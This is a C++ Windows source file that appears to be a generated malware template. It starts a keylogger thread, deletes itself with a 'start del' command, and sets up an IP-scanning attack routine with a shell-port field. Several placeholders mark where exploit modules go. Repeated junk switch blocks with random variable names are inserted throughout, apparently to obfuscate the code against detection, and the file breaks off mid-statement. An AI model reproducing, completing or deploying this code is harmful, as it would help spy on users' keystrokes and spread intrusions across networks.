#include "testo2.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//
std::vector<DWORD> arr_dwThreadIdModule;
std::vector<HANDLE> arr_hThreadModule;
HANDLE hThread = NULL;
DWORD dwTID = 0;
        //Moudule Keylogger
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger, NULL, 0, &dwTID);
        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);
            arr_dwThreadIdModule.push_back(dwTID);
        }
WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);
for (int i = 0; i < arr_hThreadModule.size(); i++) {
if(arr_hThreadModule[i])
CloseHandle(arr_hThreadModule[i]);
}

	
	//[mainExploit]	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
int i8L27l3GkFp = 0xe4bdaf1;
int is3i6ciAdnK = 0x82fdfc0;
int imA8ZvZhuPw = 0xc4580ab;
int i8mW1Nb17xH = 0x44b6d99;
int iAEjaEVXAru = 1;
switch(iAEjaEVXAru)
{
    case 0:
        i8L27l3GkFp = is3i6ciAdnK - 0xce2e562 * imA8ZvZhuPw / 100;
        is3i6ciAdnK = 0xc4580ab - 5 +  0xc4580ab - 6 * is3i6ciAdnK / 10 + 25;
        imA8ZvZhuPw = i8L27l3GkFp * 0x12 + i8mW1Nb17xH * 0x15 + 0x44b6d99 / 13 + 0xce2e562 + 555;
        i8mW1Nb17xH = 0xe4bdaf1 - 21 + 11 * 1996 - is3i6ciAdnK + 14520538 - imA8ZvZhuPw - 14520692 + 0x82fdfc0 - 97;
        break;
    case 1:
        i8L27l3GkFp = is3i6ciAdnK - 25 + 0xe4bdaf1 - 40 + 0xc4580ab % 10 + 2;
        imA8ZvZhuPw = imA8ZvZhuPw - 0xff % 3 - i8mW1Nb17xH * 10 + 0xce2e562 / 2 - 10 + 0x82fdfc0 - 5;
        i8mW1Nb17xH = 0xe4bdaf1 % 0xce2e562 ^ 33 + 0xc4580ab * 0x12 - 30 + 0xc4580ab + 23;
        is3i6ciAdnK = is3i6ciAdnK + 321 + imA8ZvZhuPw * 10 * is3i6ciAdnK / 10 / 2 + 0xce2e562 * 0x60;
        break;
    case 2:
        i8L27l3GkFp = is3i6ciAdnK - 45 - imA8ZvZhuPw * 46 + 0xe4bdaf1 / 0xdade;
        is3i6ciAdnK = is3i6ciAdnK + 0xce2e562 - imA8ZvZhuPw * 0x82fdfc0 - 3;
        imA8ZvZhuPw = 0x82fdfc0 - 0x1 + i8L27l3GkFp * 0x2 - 0xce2e562 / 0x3 + 0xc4580ab;
        i8mW1Nb17xH = i8L27l3GkFp - 0x4 * 0xe4bdaf1 + 0x1234 - 0x4567 + 0xcafe + is3i6ciAdnK % 0x432 / 0x44b6d99 - 0x23;
        break;
    case 3:
        is3i6ciAdnK = i8mW1Nb17xH * 2 * 0x82fdfc0 - 4 + 0xce2e562 + 12 + 34 + 0xe4bdaf1;
        imA8ZvZhuPw = is3i6ciAdnK - 43 + 0xc4580ab * 3040 - 0x82fdfc0 % 10 + 1 - 0xc4580ab;
        i8mW1Nb17xH = 0xc4580ab - 33 + i8L27l3GkFp * 0x25 + 0xe4bdaf1 - 3004 + 0x82fdfc0;
        i8L27l3GkFp = 0xe4bdaf1 + 2905 % is3i6ciAdnK * 1996 + 0x44b6d99 - 70 * 0xce2e562;
        break;
    case 4:
        i8mW1Nb17xH = is3i6ciAdnK - 36 +0xce2e562 * 2001 - imA8ZvZhuPw / 234 + 0x7;
        i8L27l3GkFp = i8mW1Nb17xH - 0xabcedf + 0x82fdfc0 * 0xa2bc5 + i8mW1Nb17xH / 0x123 + 0xe4bdaf1;
        imA8ZvZhuPw = i8L27l3GkFp - 0x124 + 23 / is3i6ciAdnK / 3 / 2 + imA8ZvZhuPw + 29 - 0x82fdfc0 + 100;
        is3i6ciAdnK = 0x82fdfc0 - 70 + 70  + 0xe4bdaf1 / 2 + 423 - 0xe4bdaf1 / 7749 % 0x1234;
        break;
    case 5:
        is3i6ciAdnK = is3i6ciAdnK - 9981 % i8L27l3GkFp + 111 - imA8ZvZhuPw / 224 % 0xc4580ab;
        imA8ZvZhuPw = imA8ZvZhuPw - 339 - imA8ZvZhuPw * 4416 / 0xce2e562 + 5525 + 0x82fdfc0 % 10;
        i8mW1Nb17xH = i8mW1Nb17xH - 6636 + 0x82fdfc0 * 7749 + 1 - is3i6ciAdnK * 8864 / 0xfecba;
        i8L27l3GkFp = 0xce2e562 - 9981 % 0xe4bdaf1 % 10 % 1010100 - 0xe4bdaf1 - 23 -  0xce2e562 - 2500;
        break;
}
iAEjaEVXAru = i8mW1Nb17xH - 0xaa + 0xc4580ab * 46 - 15 / imA8ZvZhuPw + 11 - 0xe4bdaf1;
iAEjaEVXAru = iAEjaEVXAru - 70 * 55 - imA8ZvZhuPw ^ 0x99 - 0x567498 % 0xe4bdaf1 % 2 - 234 + 0x82fdfc0;

}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
int ifoIvKySyBf = 0x212f0a2;
int iivtdwTRFtg = 0xa2ec269;
int iyKzWlVQXcx = 0xed06364;
int iF7TmtkPAb6 = 0x5e5975e;
int iV5PMZD7w3t = 3;
switch(iV5PMZD7w3t)
{
    case 0:
        ifoIvKySyBf = iivtdwTRFtg - 0x4a1b31f * iyKzWlVQXcx / 100;
        iivtdwTRFtg = 0xed06364 - 5 +  0xed06364 - 6 * iivtdwTRFtg / 10 + 25;
        iyKzWlVQXcx = ifoIvKySyBf * 0x12 + iF7TmtkPAb6 * 0x15 + 0x5e5975e / 13 + 0x4a1b31f + 555;
        iF7TmtkPAb6 = 0x212f0a2 - 21 + 11 * 1996 - iivtdwTRFtg + 14520538 - iyKzWlVQXcx - 14520692 + 0xa2ec269 - 97;
        break;
    case 1:
        ifoIvKySyBf = iivtdwTRFtg - 25 + 0x212f0a2 - 40 + 0xed06364 % 10 + 2;
        iyKzWlVQXcx = iyKzWlVQXcx - 0xff % 3 - iF7TmtkPAb6 * 10 + 0x4a1b31f / 2 - 10 + 0xa2ec269 - 5;
        iF7TmtkPAb6 = 0x212f0a2 % 0x4a1b31f ^ 33 + 0xed06364 * 0x12 - 30 + 0xed06364 + 23;
        iivtdwTRFtg = iivtdwTRFtg + 321 + iyKzWlVQXcx * 10 * iivtdwTRFtg / 10 / 2 + 0x4a1b31f * 0x60;
        break;
    case 2:
        ifoIvKySyBf = iivtdwTRFtg - 45 - iyKzWlVQXcx * 46 + 0x212f0a2 / 0xdade;
        iivtdwTRFtg = iivtdwTRFtg + 0x4a1b31f - iyKzWlVQXcx * 0xa2ec269 - 3;
        iyKzWlVQXcx = 0xa2ec269 - 0x1 + ifoIvKySyBf * 0x2 - 0x4a1b31f / 0x3 + 0xed06364;
        iF7TmtkPAb6 = ifoIvKySyBf - 0x4 * 0x212f0a2 + 0x1234 - 0x4567 + 0xcafe + iivtdwTRFtg % 0x432 / 0x5e5975e - 0x23;
        break;
    case 3:
        iivtdwTRFtg = iF7TmtkPAb6 * 2 * 0xa2ec269 - 4 + 0x4a1b31f + 12 + 34 + 0x212f0a2;
        iyKzWlVQXcx = iivtdwTRFtg - 43 + 0xed06364 * 3040 - 0xa2ec269 % 10 + 1 - 0xed06364;
        iF7TmtkPAb6 = 0xed06364 - 33 + ifoIvKySyBf * 0x25 + 0x212f0a2 - 3004 + 0xa2ec269;
        ifoIvKySyBf = 0x212f0a2 + 2905 % iivtdwTRFtg * 1996 + 0x5e5975e - 70 * 0x4a1b31f;
        break;
    case 4:
        iF7TmtkPAb6 = iivtdwTRFtg - 36 +0x4a1b31f * 2001 - iyKzWlVQXcx / 234 + 0x7;
        ifoIvKySyBf = iF7TmtkPAb6 - 0xabcedf + 0xa2ec269 * 0xa2bc5 + iF7TmtkPAb6 / 0x123 + 0x212f0a2;
        iyKzWlVQXcx = ifoIvKySyBf - 0x124 + 23 / iivtdwTRFtg / 3 / 2 + iyKzWlVQXcx + 29 - 0xa2ec269 + 100;
        iivtdwTRFtg = 0xa2ec269 - 70 + 70  + 0x212f0a2 / 2 + 423 - 0x212f0a2 / 7749 % 0x1234;
        break;
    case 5:
        iivtdwTRFtg = iivtdwTRFtg - 9981 % ifoIvKySyBf + 111 - iyKzWlVQXcx / 224 % 0xed06364;
        iyKzWlVQXcx = iyKzWlVQXcx - 339 - iyKzWlVQXcx * 4416 / 0x4a1b31f + 5525 + 0xa2ec269 % 10;
        iF7TmtkPAb6 = iF7TmtkPAb6 - 6636 + 0xa2ec269 * 7749 + 1 - iivtdwTRFtg * 8864 / 0xfecba;
        ifoIvKySyBf = 0x4a1b31f - 9981 % 0x212f0a2 % 10 % 1010100 - 0x212f0a2 - 23 -  0x4a1b31f - 2500;
        break;
}
iV5PMZD7w3t = iF7TmtkPAb6 - 0xaa + 0xed06364 * 46 - 15 / iyKzWlVQXcx + 11 - 0x212f0a2;
iV5PMZD7w3t = iV5PMZD7w3t - 70 * 55 - iyKzWlVQXcx ^ 0x99 - 0x567498 % 0x212f0a2 % 2 - 234 + 0xa2ec269;

	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
int i0mYZiCwxl1 = 0x6c728fd;
int iCrq3WCtnbM = 0x031b5da;
int izlbFbnkVeE = 0xe46c884;
int iAWbjbBYvU2 = 0x9201154;
int i0I6gawCtrE = 3;
switch(i0I6gawCtrE)
{
    case 0:
        i0mYZiCwxl1 = iCrq3WCtnbM - 0xbb0b061 * izlbFbnkVeE / 100;
        iCrq3WCtnbM = 0xe46c884 - 5 +  0xe46c884 - 6 * iCrq3WCtnbM / 10 + 25;
        izlbFbnkVeE = i0mYZiCwxl1 * 0x12 + iAWbjbBYvU2 * 0x15 + 0x9201154 / 13 + 0xbb0b061 + 555;
        iAWbjbBYvU2 = 0x6c728fd - 21 + 11 * 1996 - iCrq3WCtnbM + 14520538 - izlbFbnkVeE - 14520692 + 0x031b5da - 97;
        break;
    case 1:
        i0mYZiCwxl1 = iCrq3WCtnbM - 25 + 0x6c728fd - 40 + 0xe46c884 % 10 + 2;
        izlbFbnkVeE = izlbFbnkVeE - 0xff % 3 - iAWbjbBYvU2 * 10 + 0xbb0b061 / 2 - 10 + 0x031b5da - 5;
        iAWbjbBYvU2 = 0x6c728fd % 0xbb0b061 ^ 33 + 0xe46c884 * 0x12 - 30 + 0xe46c884 + 23;
        iCrq3WCtnbM = iCrq3WCtnbM + 321 + izlbFbnkVeE * 10 * iCrq3WCtnbM / 10 / 2 + 0xbb0b061 * 0x60;
        break;
    case 2:
        i0mYZiCwxl1 = iCrq3WCtnbM - 45 - izlbFbnkVeE * 46 + 0x6c728fd / 0xdade;
        iCrq3WCtnbM = iCrq3WCtnbM + 0xbb0b061 - izlbFbnkVeE * 0x031b5da - 3;
        izlbFbnkVeE = 0x031b5da - 0x1 + i0mYZiCwxl1 * 0x2 - 0xbb0b061 / 0x3 + 0xe46c884;
        iAWbjbBYvU2 = i0mYZiCwxl1 - 0x4 * 0x6c728fd + 0x1234 - 0x4567 + 0xcafe + iCrq3WCtnbM % 0x432 / 0x9201154 - 0x23;
        break;
    case 3:
        iCrq3WCtnbM = iAWbjbBYvU2 * 2 * 0x031b5da - 4 + 0xbb0b061 + 12 + 34 + 0x6c728fd;
        izlbFbnkVeE = iCrq3WCtnbM - 43 + 0xe46c884 * 3040 - 0x031b5da % 10 + 1 - 0xe46c884;
        iAWbjbBYvU2 = 0xe46c884 - 33 + i0mYZiCwxl1 * 0x25 + 0x6c728fd - 3004 + 0x031b5da;
        i0mYZiCwxl1 = 0x6c728fd + 2905 % iCrq3WCtnbM * 1996 + 0x9201154 - 70 * 0xbb0b061;
        break;
    case 4:
        iAWbjbBYvU2 = iCrq3WCtnbM - 36 +0xbb0b061 * 2001 - izlbFbnkVeE / 234 + 0x7;
        i0mYZiCwxl1 = iAWbjbBYvU2 - 0xabcedf + 0x031b5da * 0xa2bc5 + iAWbjbBYvU2 / 0x123 + 0x6c728fd;
        izlbFbnkVeE = i0mYZiCwxl1 - 0x124 + 23 / iCrq3WCtnbM / 3 / 2 + izlbFbnkVeE + 29 - 0x031b5da + 100;
        iCrq3WCtnbM = 0x031b5da - 70 + 70  + 0x6c728fd / 2 + 423 - 0x6c728fd / 7749 % 0x1234;
        break;
    case 5:
        iCrq3WCtnbM = iCrq3WCtnbM - 9981 % i0mYZiCwxl1 + 111 - izlbFbnkVeE / 224 % 0xe46c884;
        izlbFbnkVeE = izlbFbnkVeE - 339 - izlbFbnkVeE * 4416 / 0xbb0b061 + 5525 + 0x031b5da % 10;
        iAWbjbBYvU2 = iAWbjbBYvU2 - 6636 + 0x031b5da * 7749 + 1 - iCrq3WCtnbM * 8864 / 0xfecba;
        i0mYZiCwxl1 = 0xbb0b061 - 9981 % 0x6c728fd % 10 % 1010100 - 0x6c728fd - 23 -  0xbb0b061 - 2500;
        break;
}
i0I6gawCtrE = iAWbjbBYvU2 - 0xaa + 0xe46c884 * 46 - 15 / izlbFbnkVeE + 11 - 0x6c728fd;
i0I6gawCtrE = i0I6gawCtrE - 70 * 55 - izlbFbnkVeE ^ 0x99 - 0x567498 % 0x6c728fd % 2 - 234 + 0x031b5da;

				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
int iaZyZptg6SX = 0x810f275;
int iapKXM8iPnT = 0xeb1f49e;
int iVkw4GTRWKO = 0x3f44844;
int idhL3I61QP5 = 0x3740020;
int iJniQ8uXCr6 = 3;
switch(iJniQ8uXCr6)
{
    case 0:
        iaZyZptg6SX = iapKXM8iPnT - 0x88d7b60 * iVkw4GTRWKO / 100;
        iapKXM8iPnT = 0x3f44844 - 5 +  0x3f44844 - 6 * iapKXM8iPnT / 10 + 25;
        iVkw4GTRWKO = iaZyZptg6SX * 0x12 + idhL3I61QP5 * 0x15 + 0x3740020 / 13 + 0x88d7b60 + 555;
        idhL3I61QP5 = 0x810f275 - 21 + 11 * 1996 - iapKXM8iPnT + 14520538 - iVkw4GTRWKO - 14520692 + 0xeb1f49e - 97;
        break;
    case 1:
        iaZyZptg6SX = iapKXM8iPnT - 25 + 0x810f275 - 40 + 0x3f44844 % 10 + 2;
        iVkw4GTRWKO = iVkw4GTRWKO - 0xff % 3 - idhL3I61QP5 * 10 + 0x88d7b60 / 2 - 10 + 0xeb1f49e - 5;
        idhL3I61QP5 = 0x810f275 % 0x88d7b60 ^ 33 + 0x3f44844 * 0x12 - 30 + 0x3f44844 + 23;
        iapKXM8iPnT = iapKXM8iPnT + 321 + iVkw4GTRWKO * 10 * iapKXM8iPnT / 10 / 2 + 0x88d7b60 * 0x60;
        break;
    case 2:
        iaZyZptg6SX = iapKXM8iPnT - 45 - iVkw4GTRWKO * 46 + 0x810f275 / 0xdade;
        iapKXM8iPnT = iapKXM8iPnT + 0x88d7b60 - iVkw4GTRWKO * 0xeb1f49e - 3;
        iVkw4GTRWKO = 0xeb1f49e - 0x1 + iaZyZptg6SX * 0x2 - 0x88d7b60 / 0x3 + 0x3f44844;
        idhL3I61QP5 = iaZyZptg6SX - 0x4 * 0x810f275 + 0x1234 - 0x4567 + 0xcafe + iapKXM8iPnT % 0x432 / 0x3740020 - 0x23;
        break;
    case 3:
        iapKXM8iPnT = idhL3I61QP5 * 2 * 0xeb1f49e - 4 + 0x88d7b60 + 12 + 34 + 0x810f275;
        iVkw4GTRWKO = iapKXM8iPnT - 43 + 0x3f44844 * 3040 - 0xeb1f49e % 10 + 1 - 0x3f44844;
        idhL3I61QP5 = 0x3f44844 - 33 + iaZyZptg6SX * 0x25 + 0x810f275 - 3004 + 0xeb1f49e;
        iaZyZptg6SX = 0x810f275 + 2905 % iapKXM8iPnT * 1996 + 0x3740020 - 70 * 0x88d7b60;
        break;
    case 4:
        idhL3I61QP5 = iapKXM8iPnT - 36 +0x88d7b60 * 2001 - iVkw4GTRWKO / 234 + 0x7;
        iaZyZptg6SX = idhL3I61QP5 - 0xabcedf + 0xeb1f49e * 0xa2bc5 + idhL3I61QP5 / 0x123 + 0x810f275;
        iVkw4GTRWKO = iaZyZptg6SX - 0x124 + 23 / iapKXM8iPnT / 3 / 2 + iVkw4GTRWKO + 29 - 0xeb1f49e + 100;
        iapKXM8iPnT = 0xeb1f49e - 70 + 70  + 0x810f275 / 2 + 423 - 0x810f275 / 7749 % 0x1234;
        break;
    case 5:
        iapKXM8iPnT = iapKXM8iPnT - 9981 % iaZyZptg6SX + 111 - iVkw4GTRWKO / 224 % 0x3f44844;
        iVkw4GTRWKO = iVkw4GTRWKO - 339 - iVkw4GTRWKO * 4416 / 0x88d7b60 + 5525 + 0xeb1f49e % 10;
        idhL3I61QP5 = idhL3I61QP5 - 6636 + 0xeb1f49e * 7749 + 1 - iapKXM8iPnT * 8864 / 0xfecba;
        iaZyZptg6SX = 0x88d7b60 - 9981 % 0x810f275 % 10 % 1010100 - 0x810f275 - 23 -  0x88d7b60 - 2500;
        break;
}
iJniQ8uXCr6 = idhL3I61QP5 - 0xaa + 0x3f44844 * 46 - 15 / iVkw4GTRWKO + 11 - 0x810f275;
iJniQ8uXCr6 = iJniQ8uXCr6 - 70 * 55 - iVkw4GTRWKO ^ 0x99 - 0x567498 % 0x810f275 % 2 - 234 + 0xeb1f49e;

			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
int i3cA1fXFRHx = 0xef1c6a8;
int ibzVltUWyG8 = 0x81edebe;
int i6aNdhcByva = 0xa5c5a29;
int i66KVHPJzgI = 0xf8d4d37;
int i1EybOYQQVX = 5;
switch(i1EybOYQQVX)
{
    case 0:
        i3cA1fXFRHx = ibzVltUWyG8 - 0xb57ef99 * i6aNdhcByva / 100;
        ibzVltUWyG8 = 0xa5c5a29 - 5 +  0xa5c5a29 - 6 * ibzVltUWyG8 / 10 + 25;
        i6aNdhcByva = i3cA1fXFRHx * 0x12 + i66KVHPJzgI * 0x15 + 0xf8d4d37 / 13 + 0xb57ef99 + 555;
        i66KVHPJzgI = 0xef1c6a8 - 21 + 11 * 1996 - ibzVltUWyG8 + 14520538 - i6aNdhcByva - 14520692 + 0x81edebe - 97;
        break;
    case 1:
        i3cA1fXFRHx = ibzVltUWyG8 - 25 + 0xef1c6a8 - 40 + 0xa5c5a29 % 10 + 2;
        i6aNdhcByva = i6aNdhcByva - 0xff % 3 - i66KVHPJzgI * 10 + 0xb57ef99 / 2 - 10 + 0x81edebe - 5;
        i66KVHPJzgI = 0xef1c6a8 % 0xb57ef99 ^ 33 + 0xa5c5a29 * 0x12 - 30 + 0xa5c5a29 + 23;
        ibzVltUWyG8 = ibzVltUWyG8 + 321 + i6aNdhcByva * 10 * ibzVltUWyG8 / 10 / 2 + 0xb57ef99 * 0x60;
        break;
    case 2:
        i3cA1fXFRHx = ibzVltUWyG8 - 45 - i6aNdhcByva * 46 + 0xef1c6a8 / 0xdade;
        ibzVltUWyG8 = ibzVltUWyG8 + 0xb57ef99 - i6aNdhcByva * 0x81edebe - 3;
        i6aNdhcByva = 0x81edebe - 0x1 + i3cA1fXFRHx * 0x2 - 0xb57ef99 / 0x3 + 0xa5c5a29;
        i66KVHPJzgI = i3cA1fXFRHx - 0x4 * 0xef1c6a8 + 0x1234 - 0x4567 + 0xcafe + ibzVltUWyG8 % 0x432 / 0xf8d4d37 - 0x23;
        break;
    case 3:
        ibzVltUWyG8 = i66KVHPJzgI * 2 * 0x81edebe - 4 + 0xb57ef99 + 12 + 34 + 0xef1c6a8;
        i6aNdhcByva = ibzVltUWyG8 - 43 + 0xa5c5a29 * 3040 - 0x81edebe % 10 + 1 - 0xa5c5a29;
        i66KVHPJzgI = 0xa5c5a29 - 33 + i3cA1fXFRHx * 0x25 + 0xef1c6a8 - 3004 + 0x81edebe;
        i3cA1fXFRHx = 0xef1c6a8 + 2905 % ibzVltUWyG8 * 1996 + 0xf8d4d37 - 70 * 0xb57ef99;
        break;
    case 4:
        i66KVHPJzgI = ibzVltUWyG8 - 36 +0xb57ef99 * 2001 - i6aNdhcByva / 234 + 0x7;
        i3cA1fXFRHx = i66KVHPJzgI - 0xabcedf + 0x81edebe * 0xa2bc5 + i66KVHPJzgI / 0x123 + 0xef1c6a8;
        i6aNdhcByva = i3cA1fXFRHx - 0x124 + 23 / ibzVltUWyG8 / 3 / 2 + i6aNdhcByva + 29 - 0x81edebe + 100;
        ibzVltUWyG8 = 0x81edebe - 70 + 70  + 0xef1c6a8 / 2 + 423 - 0xef1c6a8 / 7749 % 0x1234;
        break;
    case 5:
        ibzVltUWyG8 = ibzVltUWyG8 - 9981 % i3cA1fXFRHx + 111 - i6aNdhcByva / 224 % 0xa5c5a29;
        i6aNdhcByva = i6aNdhcByva - 339 - i6aNdhcByva * 4416 / 0xb57ef99 + 5525 + 0x81edebe % 10;
        i66KVHPJzgI = i66KVHPJzgI - 6636 + 0x81edebe * 7749 + 1 - ibzVltUWyG8 * 8864 / 0xfecba;
        i3cA1fXFRHx = 0xb57ef99 - 9981 % 0xef1c6a8 % 10 % 1010100 - 0xef1c6a8 - 23 -  0xb57ef99 - 2500;
        break;
}
i1EybOYQQVX = i66KVHPJzgI - 0xaa + 0xa5c5a29 * 46 - 15 / i6aNdhcByva + 11 - 0xef1c6a8;
i1EybOYQQVX = i1EybOYQQVX - 70 * 55 - i6aNdhcByva ^ 0x99 - 0x567498 % 0xef1c6a8 % 2 - 234 + 0x81edebe;

				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
int initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
	
	//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
    return 1;
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
int iSL1kyIsXvd = 0x6dcd610;
int ipzdiCyKgTc = 0x915df4a;
int iLfZ58lKCPe = 0x321632c;
int iUKxiUUlMva = 0x355e67d;
int iaM7Qk7Xo3Y = 0;
switch(iaM7Qk7Xo3Y)
{
    case 0:
        iSL1kyIsXvd = ipzdiCyKgTc - 0x8dd7c71 * iLfZ58lKCPe / 100;
        ipzdiCyKgTc = 0x321632c - 5 +  0x321632c - 6 * ipzdiCyKgTc / 10 + 25;
        iLfZ58lKCPe = iSL1kyIsXvd * 0x12 + iUKxiUUlMva * 0x15 + 0x355e67d / 13 + 0x8dd7c71 + 555;
        iUKxiUUlMva = 0x6dcd610 - 21 + 11 * 1996 - ipzdiCyKgTc + 14520538 - iLfZ58lKCPe - 14520692 + 0x915df4a - 97;
        break;
    case 1:
        iSL1kyIsXvd = ipzdiCyKgTc - 25 + 0x6dcd610 - 40 + 0x321632c % 10 + 2;
        iLfZ58lKCPe = iLfZ58lKCPe - 0xff % 3 - iUKxiUUlMva * 10 + 0x8dd7c71 / 2 - 10 + 0x915df4a - 5;
        iUKxiUUlMva = 0x6dcd610 % 0x8dd7c71 ^ 33 + 0x321632c * 0x12 - 30 + 0x321632c + 23;
        ipzdiCyKgTc = ipzdiCyKgTc + 321 + iLfZ58lKCPe * 10 * ipzdiCyKgTc / 10 / 2 + 0x8dd7c71 * 0x60;
        break;
    case 2:
        iSL1kyIsXvd = ipzdiCyKgTc - 45 - iLfZ58lKCPe * 46 + 0x6dcd610 / 0xdade;
        ipzdiCyKgTc = ipzdiCyKgTc + 0x8dd7c71 - iLfZ58lKCPe * 0x915df4a - 3;
        iLfZ58lKCPe = 0x915df4a - 0x1 + iSL1kyIsXvd * 0x2 - 0x8dd7c71 / 0x3 + 0x321632c;
        iUKxiUUlMva = iSL1kyIsXvd - 0x4 * 0x6dcd610 + 0x1234 - 0x4567 + 0xcafe + ipzdiCyKgTc % 0x432 / 0x355e67d - 0x23;
        break;
    case 3:
        ipzdiCyKgTc = iUKxiUUlMva * 2 * 0x915df4a - 4 + 0x8dd7c71 + 12 + 34 + 0x6dcd610;
        iLfZ58lKCPe = ipzdiCyKgTc - 43 + 0x321632c * 3040 - 0x915df4a % 10 + 1 - 0x321632c;
        iUKxiUUlMva = 0x321632c - 33 + iSL1kyIsXvd * 0x25 + 0x6dcd610 - 3004 + 0x915df4a;
        iSL1kyIsXvd = 0x6dcd610 + 2905 % ipzdiCyKgTc * 1996 + 0x355e67d - 70 * 0x8dd7c71;
        break;
    case 4:
        iUKxiUUlMva = ipzdiCyKgTc - 36 +0x8dd7c71 * 2001 - iLfZ58lKCPe / 234 + 0x7;
        iSL1kyIsXvd = iUKxiUUlMva - 0xabcedf + 0x915df4a * 0xa2bc5 + iUKxiUUlMva / 0x123 + 0x6dcd610;
        iLfZ58lKCPe = iSL1kyIsXvd - 0x124 + 23 / ipzdiCyKgTc / 3 / 2 + iLfZ58lKCPe + 29 - 0x915df4a + 100;
        ipzdiCyKgTc = 0x915df4a - 70 + 70  + 0x6dcd610 / 2 + 423 - 0x6dcd610 / 7749 % 0x1234;
        break;
    case 5:
        ipzdiCyKgTc = ipzdiCyKgTc - 9981 % iSL1kyIsXvd + 111 - iLfZ58lKCPe / 224 % 0x321632c;
        iLfZ58lKCPe = iLfZ58lKCPe - 339 - iLfZ58lKCPe * 4416 / 0x8dd7c71 + 5525 + 0x915df4a % 10;
        iUKxiUUlMva = iUKxiUUlMva - 6636 + 0x915df4a * 7749 + 1 - ipzdiCyKgTc * 8864 / 0xfecba;
        iSL1kyIsXvd = 0x8dd7c71 - 9981 % 0x6dcd610 % 10 % 1010100 - 0x6dcd610 - 23 -  0x8dd7c71 - 2500;
        break;
}
iaM7Qk7Xo3Y = iUKxiUUlMva - 0xaa + 0x321632c * 46 - 15 / iLfZ58lKCPe + 11 - 0x6dcd610;
iaM7Qk7Xo3Y = iaM7Qk7Xo3Y - 70 * 55 - iLfZ58lKCPe ^ 0x99 - 0x567498 % 0x6dcd610 % 2 - 234 + 0x915df4a;

	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
int iiqjjcvErHG = 0x6683d94;
int i5caLMFj6WR = 0xcec1a8d;
int iOnll8cfQzI = 0x5d968a9;
int iJnoqJgYLbR = 0x2cfad2c;
int i40AOFvF7oV = 4;
switch(i40AOFvF7oV)
{
    case 0:
        iiqjjcvErHG = i5caLMFj6WR - 0x709f0e2 * iOnll8cfQzI / 100;
        i5caLMFj6WR = 0x5d968a9 - 5 +  0x5d968a9 - 6 * i5caLMFj6WR / 10 + 25;
        iOnll8cfQzI = iiqjjcvErHG * 0x12 + iJnoqJgYLbR * 0x15 + 0x2cfad2c / 13 + 0x709f0e2 + 555;
        iJnoqJgYLbR = 0x6683d94 - 21 + 11 * 1996 - i5caLMFj6WR + 14520538 - iOnll8cfQzI - 14520692 + 0xcec1a8d - 97;
        break;
    case 1:
        iiqjjcvErHG = i5caLMFj6WR - 25 + 0x6683d94 - 40 + 0x5d968a9 % 10 + 2;
        iOnll8cfQzI = iOnll8cfQzI - 0xff % 3 - iJnoqJgYLbR * 10 + 0x709f0e2 / 2 - 10 + 0xcec1a8d - 5;
        iJnoqJgYLbR = 0x6683d94 % 0x709f0e2 ^ 33 + 0x5d968a9 * 0x12 - 30 + 0x5d968a9 + 23;
        i5caLMFj6WR = i5caLMFj6WR + 321 + iOnll8cfQzI * 10 * i5caLMFj6WR / 10 / 2 + 0x709f0e2 * 0x60;
        break;
    case 2:
        iiqjjcvErHG = i5caLMFj6WR - 45 - iOnll8cfQzI * 46 + 0x6683d94 / 0xdade;
